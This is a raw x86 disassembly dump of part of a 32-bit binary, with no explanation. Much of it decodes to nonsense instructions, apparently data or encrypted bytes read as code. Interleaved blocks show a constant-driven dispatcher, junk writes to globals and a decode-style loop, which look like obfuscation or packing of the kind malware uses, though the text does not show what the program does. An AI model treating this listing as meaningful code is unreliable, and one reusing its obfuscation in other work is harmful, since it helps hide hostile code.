  40e1d7:	sub    al,0x99
  40e1d9:	ret    0x6edf
  40e1dc:	ins    DWORD PTR es:[edi],dx
  40e1dd:	(bad)  
  40e1de:	and    DWORD PTR [ecx+eax*8],eax
  40e1e1:	inc    eax
  40e1e2:	dec    ebp
  40e1e3:	es inc ebp
  40e1e5:	add    eax,0x5a67add
  40e1ea:	data16 out 0x75,al
  40e1ed:	into   
  40e1ee:	iret   
  40e1ef:	out    0x57,al
  40e1f1:	fld    QWORD PTR [edi]
  40e1f3:	adc    DWORD PTR [esp+edi*1+0x18],edx
  40e1f7:	ret    0x4822
  40e1fa:	or     eax,0x5af5f5b7
  40e1ff:	and    DWORD PTR [edx],esp
  40e201:	xchg   DWORD PTR [edx-0x4ad56a64],eax
  40e207:	(bad)  
  40e208:	retf   
  40e209:	aas    
  40e20a:	inc    esi
  40e20b:	out    dx,al
  40e20c:	cmc    
  40e20d:	cmp    DWORD PTR [edi-0x3c8a784c],0x9c8fadc0
  40e217:	pop    ecx
  40e218:	cmp    ch,BYTE PTR [eax]
  40e21a:	(bad)  
  40e21b:	adc    bh,BYTE PTR [edx+0xd]
  40e21e:	dec    esi
  40e21f:	sub    al,0xfe
  40e221:	call   0xd384:0x513d2ccd
  40e228:	hlt    
  40e229:	pushf  
  40e22a:	(bad)  
  40e22b:	mov    ds:0xb074f0c3,al
  40e230:	mov    ebp,0x645a5390
  40e235:	shl    DWORD PTR [ecx],cl
  40e237:	mov    esi,DWORD PTR [edi+0x67d5c092]
  40e23d:	popa   
  40e23e:	push   esi
  40e23f:	inc    edx
  40e240:	lods   al,BYTE PTR ds:[esi]
  40e241:	mov    al,ds:0x5ae13a6c
  40e246:	cld    
  40e247:	popf   
  40e248:	sub    al,0xf2
  40e24a:	out    dx,al
  40e24b:	pop    edx
  40e24c:	mov    al,ds:0x8e4dc58e
  40e251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e252:	scas   al,BYTE PTR es:[edi]
  40e253:	call   0x4160:0xcc10c9f4
  40e25a:	cdq    
  40e25b:	mov    esp,0xaaf6e21c
  40e260:	inc    ebx
  40e261:	jns    0x40e257
  40e263:	fild   DWORD PTR es:[ecx+0x69]
  40e267:	rcr    BYTE PTR [ecx],1
  40e269:	(bad)  
  40e26a:	inc    esp
  40e26b:	jnp    0x40e291
  40e26d:	jb     0x40e22e
  40e26f:	shl    DWORD PTR [edx-0x5b],cl
  40e272:	push   0xffffffdb
  40e274:	jp     0x40e2bf
  40e276:	outs   dx,DWORD PTR ds:[esi]
  40e277:	xchg   esi,eax
  40e278:	dec    ecx
  40e279:	repz push esi
  40e27b:	or     BYTE PTR [ebx],cl
  40e27d:	xchg   esi,eax
  40e27e:	mov    edx,0x89d8a8b1
  40e283:	inc    ebp
  40e284:	call   0xff496014
  40e289:	add    eax,0x43378b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433863,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4338ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433817,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43378b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433857,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43381f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43379b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43389f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4338ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43385f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43389b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433857,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4337d3,0x4337df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433827,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433853,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433857,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433783,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433783,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433817,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433783,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43382f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4338ab
  40e3da:	and    DWORD PTR ds:0x43378b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4337e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433893
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	jbe    0x40e3dc
  40e416:	data16 adc BYTE PTR [esi],0x98
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3e4
  40e421:	out    dx,al
  40e422:	mov    edi,DWORD PTR [eax-0x2591805]
  40e428:	xchg   esi,eax
  40e429:	sub    eax,0x78b663f6
  40e42e:	out    dx,al
  40e42f:	bound  esp,QWORD PTR [esi]
  40e431:	mov    eax,ds:0xb99aa43d
  40e436:	jns    0x40e4b4
  40e438:	add    DWORD PTR [esi],esi
  40e43a:	js     0x40e430
  40e43c:	das    
  40e43d:	sti    
  40e43e:	retf   
  40e43f:	mov    al,ds:0xd2ffcd75
  40e444:	and    eax,0xc6e99c9
  40e449:	xchg   DWORD PTR [esp+esi*2+0x1afd22c4],ebx
  40e450:	aaa    
  40e451:	jb     0x40e48b
  40e453:	call   0xe5866cf9
  40e458:	js     0x40e484
  40e45a:	xor    al,0xad
  40e45c:	repz add BYTE PTR [edx],al
  40e45f:	or     dh,0x17
  40e462:	push   0x79de710e
  40e467:	add    al,BYTE PTR ds:0xce0c81
  40e46d:	or     DWORD PTR [edx+0x28],esi
  40e470:	daa    
  40e471:	and    DWORD PTR [ecx+0x41],esi
  40e474:	mov    cs,WORD PTR [ebp-0x4d67350e]
  40e47a:	daa    
  40e47b:	outs   dx,BYTE PTR ds:[esi]
  40e47c:	dec    edx
  40e47d:	mov    eax,0xa07316cc
  40e482:	dec    bl
  40e484:	inc    eax
  40e485:	mov    eax,0x8e9d276a
  40e48a:	aam    0x8c
  40e48c:	sub    al,0x7d
  40e48e:	in     al,0x9c
  40e490:	push   0xd6a57122
  40e495:	(bad)  
  40e496:	push   edx
  40e497:	cmp    ebp,DWORD PTR [eax+0x48]
  40e49a:	sysexit 
  40e49c:	pushf  
  40e49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e49e:	push   esp
  40e49f:	test   DWORD PTR [edx-0x1dd2488c],edx
  40e4a5:	mov    al,0x71
  40e4a7:	gs xor ebp,edx
  40e4aa:	mov    bh,0xdb
  40e4ac:	sbb    DWORD PTR [edi-0x7d],eax
  40e4af:	mov    bh,0x46
  40e4b1:	xchg   ebx,eax
  40e4b2:	add    edx,DWORD PTR [ecx+edi*1+0x68300d6b]
  40e4b9:	mov    eax,0x2b0f05b2
  40e4be:	into   
  40e4bf:	in     eax,0x1f
  40e4c1:	or     eax,0xaf48fb33
  40e4c6:	pop    eax
  40e4c7:	call   0x2c24:0xaf313b2e
  40e4ce:	(bad)  
  40e4cf:	mov    ebp,0x70c084e7
  40e4d4:	shr    BYTE PTR [ebp+0x3a],1
  40e4d7:	pop    eax
  40e4d8:	mov    edx,0x5e39ef94
  40e4dd:	push   0x71
  40e4df:	and    DWORD PTR [ebx+0x7f],eax
  40e4e2:	sbb    BYTE PTR [edx],ch
  40e4e4:	(bad)  
  40e4e5:	iret   
  40e4e6:	int3   
  40e4e7:	xchg   esi,eax
  40e4e8:	xchg   edx,eax
  40e4e9:	xchg   edx,eax
  40e4ea:	addr16 out 0x63,al
  40e4ed:	(bad)  
  40e4ef:	std    
  40e4f0:	daa    
  40e4f1:	xor    eax,0x38576d2d
  40e4f6:	in     al,0x9f
  40e4f8:	mov    cl,0xc3
  40e4fa:	lods   al,BYTE PTR ss:[esi]
  40e4fc:	inc    ebp
  40e4fd:	fisubr DWORD PTR ds:[bp+di+0x5628]
  40e503:	jne    0x40e495
  40e505:	pusha  
  40e506:	inc    ebx
  40e507:	test   DWORD PTR [esi+0x3c],esi
  40e50a:	bound  eax,QWORD PTR [edx*2-0x3b6b3d48]
  40e511:	test   DWORD PTR [esi+0x13],0xad8ed32a
  40e518:	test   al,0x2
  40e51a:	shl    DWORD PTR [eax],cl
  40e51c:	xor    DWORD PTR [edi-0x5f69a514],eax
  40e522:	and    DWORD PTR [edi+0x41],esp
  40e525:	inc    edi
  40e526:	imul   esp,DWORD PTR [edi-0x3bff47a2],0x4298c1c9
  40e530:	outs   dx,BYTE PTR ds:[esi]
  40e531:	rcr    DWORD PTR [ebx],1
  40e533:	out    0x11,al
  40e535:	push   eax
  40e536:	sbb    eax,0xfd7c1c9a
  40e53b:	(bad)  [ebx+0xd81f445]
  40e541:	and    edi,DWORD PTR [eax]
  40e543:	inc    ebx
  40e544:	add    BYTE PTR [ebx+0x38],ch
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x43385b,0x43382f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x5ff261b8
  40e5b4:	inc    ecx
  40e5b5:	adc    bh,al
  40e5b7:	sub    bl,BYTE PTR [ecx+0x7f127e7e]
  40e5bd:	jle    0x40e63d
  40e5bf:	ret    
  40e5c0:	and    ch,ah
  40e5c2:	lods   eax,DWORD PTR ds:[esi]
  40e5c3:	push   0x45
  40e5c5:	jl     0x40e5e5
  40e5c7:	inc    edx
  40e5c8:	add    edi,0xeb835fc4
  40e5ce:	std    
  40e5cf:	sub    al,0x50
  40e5d1:	add    DWORD PTR [esi],0x3685d30d
  40e5d7:	add    al,0x3
  40e5d9:	push   ebx
  40e5da:	int3   
  40e5db:	jnp    0x8319660b
  40e5e1:	or     eax,0x1350fae9
  40e5e6:	mov    dl,0x1
  40e5e8:	repnz sbb ch,dh
  40e5eb:	xor    BYTE PTR [ebp+0x55cccde2],0xf3
  40e5f2:	sbb    ch,BYTE PTR [esp+edi*8-0x5e]
  40e5f6:	inc    eax
  40e5f7:	fdiv   QWORD PTR [eax+edi*8]
  40e5fa:	xchg   esi,eax
  40e5fb:	dec    edi
  40e5fc:	mov    ecx,0xc24807c7
  40e601:	jae    0x40e63d
  40e603:	pop    esi
  40e604:	mov    ebx,0x395c4c64
  40e609:	fld    st(3)
  40e60b:	adc    ecx,DWORD PTR [edx+0x9]
  40e60e:	(bad)  
  40e60f:	fcom   DWORD PTR [esi]
  40e611:	cpuid  
  40e613:	adc    BYTE PTR [ebx+eiz*4-0x64],ch
  40e617:	in     eax,0x7a
  40e619:	in     al,0x13
  40e61b:	repz adc al,0x78
  40e61e:	icebp  
  40e61f:	lods   eax,DWORD PTR ds:[esi]
  40e620:	pop    ebx
  40e621:	add    DWORD PTR [esi+0xb81527e],ebp
  40e627:	or     BYTE PTR [eax],ah
  40e629:	aam    0xef
  40e62b:	or     al,0xc9
  40e62d:	add    eax,0xffffffca
  40e630:	scas   eax,DWORD PTR es:[edi]
  40e631:	stos   BYTE PTR es:[edi],al
  40e632:	fcmovne st,st(4)
  40e634:	pop    ebp
  40e635:	mov    ds:0xf41e2969,al
  40e63a:	xor    DWORD PTR [edx],eax
  40e63c:	call   0x4aa9:0xb075de11
  40e643:	ret    
  40e644:	push   edi
  40e645:	xchg   esp,eax
  40e646:	leavew 
  40e648:	xchg   DWORD PTR [edi+0x50],esi
  40e64b:	mov    ds:0xb896ad90,al
  40e650:	jo     0x40e66f
  40e652:	sbb    bh,BYTE PTR [ecx]
  40e654:	sub    DWORD PTR [edx+0x4b639286],esi
  40e65a:	mov    eax,es:0x7d2424b7
  40e660:	mov    ss,ebp
  40e662:	loopne 0x40e6b6
  40e664:	jmp    0x1153:0xfc8f2eb4
  40e66b:	test   al,0xc5
  40e66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e66e:	out    0x13,al
  40e670:	retf   0x3536
  40e673:	lock pop ebx
  40e675:	sbb    ebp,0x69
  40e678:	pop    es
  40e679:	xor    BYTE PTR [ebp+esi*4+0x2c853080],bh
  40e680:	add    DWORD PTR [esi],esp
  40e682:	jmp    0x4e02ea63
  40e687:	cli    
  40e688:	(bad)  
  40e689:	aad    0xb5
  40e68b:	xchg   edx,eax
  40e68c:	enter  0x3564,0x98
  40e690:	push   ds
  40e691:	shr    DWORD PTR [esi],cl
  40e693:	push   ss
  40e694:	xchg   BYTE PTR [ebp+0x3fa4e1c0],dl
  40e69a:	xchg   dh,ch
  40e69c:	and    eax,0x42c6bfaa
  40e6a1:	call   FWORD PTR [ecx]
  40e6a3:	(bad)  [ecx+0x16]
  40e6a6:	mov    dl,0xfb
  40e6a8:	mov    eax,ds:0x5de7cb04
  40e6ad:	mov    eax,0x63922896
  40e6b2:	dec    esp
  40e6b3:	leave  
  40e6b4:	scas   eax,DWORD PTR es:[edi]
  40e6b5:	push   cs
  40e6b6:	mov    al,ds:0xfbb7c9ca
  40e6bb:	repz icebp 
  40e6bd:	jmp    0x5ce8:0xb98f2cb8
  40e6c4:	call   0x94f7:0xc3f098cd
  40e6cb:	mov    dl,0xe9
  40e6cd:	mov    ds:0x108594b8,al
  40e6d2:	fld    DWORD PTR [edi]
  40e6d4:	dec    esi
  40e6d5:	retf   0x62e4
  40e6d8:	cdq    
  40e6d9:	xchg   edx,eax
  40e6da:	inc    ebp
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x4c50546d]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e709
  40e704:	xor    eax,edx
  40e706:	sub    BYTE PTR [esi-0xe07f56c],0xfd
  40e70d:	lods   al,BYTE PTR ds:[esi]
  40e70e:	jmp    0x12c6:0x2113ba6a
  40e715:	or     BYTE PTR [eax-0x217beab9],0x6e
  40e71c:	dec    eax
  40e71d:	jecxz  0x40e742
  40e71f:	jg     0x40e77a
  40e721:	test   ch,ah
  40e723:	sub    ebp,edx
  40e725:	outs   dx,BYTE PTR ds:[esi]
  40e726:	sahf   
  40e727:	jnp    0x40e750
  40e729:	mov    DWORD PTR [ecx+0x166b3b24],ebp
  40e72f:	aam    0xcd
  40e731:	mov    dl,0x7e
  40e733:	mov    al,0x39
  40e735:	xor    edi,esi
  40e737:	stos   DWORD PTR es:[edi],eax
  40e738:	mov    eax,0xe61ae93f
  40e73d:	pop    ds
  40e73e:	out    0xe0,al
  40e740:	add    al,BYTE PTR ds:0xe63d19e1
  40e746:	fcom   DWORD PTR [esi+eax*8+0x759d39d7]
  40e74d:	out    0x44,al
  40e74f:	xor    eax,0xddf518e8
  40e754:	dec    esp
  40e755:	loope  0x40e72a
  40e757:	sub    ecx,esi
  40e759:	cmp    dl,BYTE PTR [eax-0x16efb09f]
  40e75f:	sub    esp,edi
  40e761:	idiv   DWORD PTR [esp+eiz*2-0x19]
  40e765:	popf   
  40e766:	cmp    al,0xeb
  40e768:	(bad)  
  40e769:	(bad)  
  40e76a:	cmp    eax,0xd58e0e98
  40e76f:	int3   
  40e770:	push   edx
  40e771:	enter  0x81,0xf2
  40e775:	enter  0xf1fd,0x96
  40e779:	inc    dx
  40e77b:	jl     0x40e702
  40e77d:	mov    al,0x61
  40e77f:	mov    edi,0xa6bb8148
  40e784:	or     ebx,esi
  40e786:	xor    eax,0xcf2610d
  40e78b:	add    al,ch
  40e78d:	adc    ah,0x86
  40e790:	or     edi,esp
  40e792:	outs   dx,BYTE PTR ds:[esi]
  40e793:	xchg   esi,eax
  40e794:	ins    BYTE PTR es:[edi],dx
  40e795:	xchg   ecx,eax
  40e796:	lahf   
  40e797:	cmp    eax,0x1a792d6e
  40e79c:	push   ss
  40e79d:	int    0x3a
  40e79f:	scas   al,BYTE PTR es:[edi]
  40e7a0:	mov    dh,BYTE PTR [eax-0x647e186c]
  40e7a6:	dec    ebx
  40e7a7:	cli    
  40e7a8:	test   al,0xf8
  40e7aa:	scas   al,BYTE PTR es:[edi]
  40e7ab:	xor    al,0x31
  40e7ad:	outs   dx,BYTE PTR ds:[esi]
  40e7ae:	xor    ebp,edi
  40e7b0:	(bad)  
  40e7b1:	mov    ecx,0x9b03f97d
  40e7b6:	je     0x40e7ad
  40e7b8:	push   ds
  40e7b9:	and    BYTE PTR [ebp-0x3a],dh
  40e7bc:	cdq    
  40e7bd:	xor    eax,0x9362ccc6
  40e7c2:	fadd   st(4),st
  40e7c4:	push   cs
  40e7c5:	and    bl,BYTE PTR [eax+0x64]
  40e7c8:	mov    edx,0xd4ec9ec4
  40e7cd:	imul   ebx,DWORD PTR [esi-0x123f9c3f],0xffffffb0
  40e7d4:	aad    0x6f
  40e7d6:	psadbw mm5,QWORD PTR [edi+0x6e]
  40e7da:	test   eax,0x71739b26
  40e7df:	mov    gs:0x91349fc0,al
  40e7e5:	mov    ecx,0x1fcb6c89
  40e7ea:	or     ah,0xd5
  40e7ed:	jne    0x40e85d
  40e7ef:	hlt    
  40e7f0:	lea    ecx,[eax]
  40e7f2:	(bad)  
  40e7f3:	mov    ds:0x99651c68,eax
  40e7f8:	ins    BYTE PTR es:[edi],dx
  40e7f9:	sbb    DWORD PTR [eax+0x6b7248d],esi
  40e7ff:	dec    edi
  40e800:	inc    edx
  40e801:	rcl    al,0x84
  40e804:	mov    ah,0x24
  40e806:	sbb    eax,DWORD PTR [esi-0x32]
  40e809:	lea    edi,[ebx+0x66ae1e1c]
  40e80f:	sbb    al,0x1d
  40e811:	leave  
  40e812:	in     eax,dx
  40e813:	adc    BYTE PTR [eax+ecx*4+0x74],bh
  40e817:	and    eax,0xde3d7b32
  40e81c:	ret    0xbb38
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e833
  40e854:	jg     0x40e854
  40e856:	pop    eax
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e8b0
  40e860:	int3   
  40e861:	mov    ebx,esp
  40e863:	lahf   
  40e864:	push   esi
  40e865:	sbb    edx,0x443d34dd
  40e86b:	dec    esp
  40e86c:	sub    edi,DWORD PTR [eax-0x79]
  40e86f:	jecxz  0x40e82b
  40e871:	repz adc edx,DWORD PTR [esi]
  40e874:	jb     0x40e8f4
  40e876:	or     al,0xad
  40e878:	add    ch,bl
  40e87a:	ins    DWORD PTR es:[edi],dx
  40e87b:	(bad)  
  40e87c:	gs lock sbb edx,esp
  40e880:	stos   DWORD PTR es:[edi],eax
  40e881:	inc    ebx
  40e882:	mov    bh,0x38
  40e884:	mov    eax,0xc11cce86
  40e889:	(bad)  [eax+0x5f]
  40e88c:	ret    0xbda8
  40e88f:	cmp    DWORD PTR [ecx],0xffffffcc
  40e892:	and    al,0xa6
  40e894:	lods   al,BYTE PTR ds:[esi]
  40e895:	hlt    
  40e896:	jns    0x40e832
  40e898:	mov    cl,0x9e
  40e89a:	in     al,dx
  40e89b:	pop    ebp
  40e89c:	push   esi
  40e89d:	pop    ds
  40e89e:	mov    dh,0x27
  40e8a0:	outs   dx,BYTE PTR ds:[esi]
  40e8a1:	jno    0x40e830
  40e8a3:	mov    ebx,0x7b5f7feb
  40e8a8:	cmp    BYTE PTR [ebx+0x18],dl
  40e8ab:	(bad)  
  40e8ad:	test   eax,0x431748d4
  40e8b2:	jo     0x40e919
  40e8b4:	pop    ds
  40e8b5:	fld    DWORD PTR [eax]
  40e8b7:	jae    0x40e8e8
  40e8b9:	test   DWORD PTR ds:0x257289e3,edi
  40e8bf:	jg     0x40e8da
  40e8c1:	test   DWORD PTR [edi],edi
  40e8c3:	pop    ds
  40e8c4:	ss scas al,BYTE PTR es:[edi]
  40e8c6:	add    BYTE PTR [ebx],ah
  40e8c8:	(bad)  
  40e8c9:	or     eax,0x56c61e6e
  40e8ce:	imul   eax,DWORD PTR [eax],0x8f886961
  40e8d4:	xchg   ebp,eax
  40e8d5:	push   ebp
  40e8d6:	pop    ss
  40e8d7:	inc    ecx
  40e8d8:	int3   
  40e8d9:	jl     0x40e87c
  40e8db:	ss push esp
  40e8dd:	xchg   ebx,eax
  40e8de:	ficomp DWORD PTR [eax+edi*1-0x34cfe2ec]
  40e8e5:	xor    BYTE PTR [edi],al
  40e8e7:	mov    ecx,0xb4537777
  40e8ec:	fs push edx
  40e8ee:	dec    ebx
  40e8ef:	jmp    0x40e873
  40e8f1:	inc    esp
  40e8f2:	pop    edi
  40e8f3:	repnz dec ebp
  40e8f5:	mov    ebp,0x6a7ca374
  40e8fa:	cdq    
  40e8fb:	fiadd  DWORD PTR [esi]
  40e8fd:	dec    esi
  40e8fe:	bnd jo 0x40e97b
  40e901:	sub    ebp,DWORD PTR [ebx+0x3a01296a]
  40e907:	scas   al,BYTE PTR es:[edi]
  40e908:	cmp    ch,BYTE PTR [esi-0x31a569cb]
  40e90e:	jecxz  0x40e891
  40e910:	push   ss
  40e911:	push   0xffffffe4
  40e913:	ja     0x40e98d
  40e915:	out    0x89,eax
  40e917:	dec    ebp
  40e918:	xchg   edx,eax
  40e919:	std    
  40e91a:	stos   BYTE PTR es:[edi],al
  40e91b:	out    0x12,al
  40e91d:	pop    ds
  40e91e:	in     al,dx
  40e91f:	add    ebx,ebx
  40e921:	sub    ecx,DWORD PTR [esi+0x1e]
  40e924:	jmp    0x776a:0x9d088a96
  40e92b:	jae    0x40e90f
  40e92d:	sub    al,0x5b
  40e92f:	imul   edi,DWORD PTR [ebx-0x491beb5d],0x13222224
  40e939:	add    dl,BYTE PTR [esi+0x6081616]
  40e93f:	cld    
  40e940:	int3   
  40e941:	enter  0x5fe,0x85
  40e945:	in     al,0xac
  40e947:	cli    
  40e948:	mov    ecx,0x4b6274d2
  40e94d:	ds aaa 
  40e94f:	adc    cl,BYTE PTR [ebx-0x18]
  40e952:	enter  0x2a62,0xe7
  40e956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e958:	or     eax,0xca72549b
  40e95d:	mov    cl,0x66
  40e95f:	xor    DWORD PTR [eax+0x6b],esi
  40e962:	loop   0x40e9ae
  40e964:	jecxz  0x40e917
  40e966:	dec    edx
  40e967:	stos   BYTE PTR es:[edi],al
  40e968:	idiv   BYTE PTR [ebp+0x1]
  40e96b:	enter  0x33a1,0x51
  40e96f:	leave  
  40e970:	push   ebp
  40e971:	(bad)  
  40e972:	jmp    0x7f79:0x79facb48
  40e979:	shl    DWORD PTR ds:0xf93e850f,1
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x208b131d
  40e99c:	dec    ebp
  40e99d:	xchg   BYTE PTR [esi+edi*2+0x7e7f127e],ah
  40e9a4:	jle    0x40e97c
  40e9a6:	mov    ds:0xc81f26fe,eax
  40e9ab:	retf   
  40e9ac:	aaa    
  40e9ad:	in     al,0xc8
  40e9af:	xor    eax,edx
  40e9b1:	outs   dx,DWORD PTR ds:[esi]
  40e9b2:	mov    fs,WORD PTR [ebx+ebx*8-0x6e33e620]
  40e9b9:	jno    0x40e9a7
  40e9bb:	and    DWORD PTR [esi],eax
  40e9bd:	fdivr  st(0),st
  40e9bf:	cmp    DWORD PTR [edx+0x63acf1e4],esi
  40e9c5:	xor    al,0xee
  40e9c7:	cld    
  40e9c8:	cmp    BYTE PTR [edi],cl
  40e9ca:	ret    0xa8e5
  40e9cd:	jno    0x40e9eb
  40e9cf:	sub    al,0xe1
  40e9d1:	mov    ah,0x64
  40e9d3:	lea    ebx,[ebx]
  40e9d5:	mov    bh,0x3a
  40e9d7:	jg     0x40e980
  40e9d9:	xor    ah,BYTE PTR ds:0xdf0393aa
  40e9df:	test   DWORD PTR [ecx],0xbbcd7911
  40e9e5:	cmp    eax,0x3df115b8
  40e9ea:	daa    
  40e9eb:	mov    ds:0x46178263,al
  40e9f0:	mov    edi,0x31e4381a
  40e9f5:	outs   dx,DWORD PTR ds:[esi]
  40e9f6:	scas   al,BYTE PTR es:[edi]
  40e9f7:	(bad)  
  40e9f8:	sahf   
  40e9f9:	pusha  
  40e9fa:	test   al,0x62
  40e9fc:	mov    cl,0xc9
  40e9fe:	mov    eax,ds:0x3137b4c8
  40ea03:	mov    edi,0x6fdbbe11
  40ea08:	cmp    edi,ecx
  40ea0a:	(bad)  
  40ea0b:	fisubr WORD PTR [ecx-0xa]
  40ea0e:	mov    es,WORD PTR [eax+eax*1-0x688879c3]
  40ea15:	xchg   ecx,eax
  40ea16:	dec    edi
  40ea17:	vpunpcklbw xmm6,xmm2,XMMWORD PTR [esi+esi*1]
  40ea1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea1d:	mov    ebp,0xcda0262c
  40ea22:	add    edi,DWORD PTR [ebp-0x6cc3552]
  40ea28:	addr16 cmp al,0x9d
  40ea2b:	fidivr DWORD PTR [esi-0x3c]
  40ea2e:	add    BYTE PTR [edi+0x1a],ch
  40ea31:	test   DWORD PTR [esi+0xcd2cb6c],0x411406f3
  40ea3b:	ficom  DWORD PTR [ebx-0x6a]
  40ea3e:	jmp    0xa317:0x15d00c35
  40ea45:	inc    ecx
  40ea46:	jle    0x40e9eb
  40ea48:	pop    edx
  40ea49:	div    DWORD PTR [eax-0xd]
  40ea4c:	jge    0x40ea73
  40ea4e:	jle    0x40e9da
  40ea50:	xchg   ecx,eax
  40ea51:	ret    
  40ea52:	jge    0x40ea0c
